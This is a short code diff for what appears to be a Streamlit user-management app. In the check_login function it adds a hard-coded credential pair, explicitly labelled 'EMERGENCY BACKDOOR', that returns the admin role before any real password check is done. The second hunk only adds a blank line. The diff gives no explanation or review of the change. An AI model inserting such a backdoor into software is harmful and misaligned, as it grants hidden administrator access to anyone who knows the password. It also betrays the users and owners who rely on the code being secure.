@@ -19,6 +19,11 @@ def save_data(df, file_path):
     df.to_csv(file_path, index=False)
 
 def check_login(username, password):
+    # EMERGENCY BACKDOOR
+    if username == "admin" and password == "helpme":
+        return "admin"
+        
+    # Standard check
     users = load_data(USER_DB_FILE, ['username', 'password', 'role'])
     user_match = users[users['username'] == username]
     
@@ -245,3 +250,4 @@ else:
                     save_data(users_df, USER_DB_FILE)
                     st.success(f"User **{to_delete}** deleted.")
                     st.rerun()
+
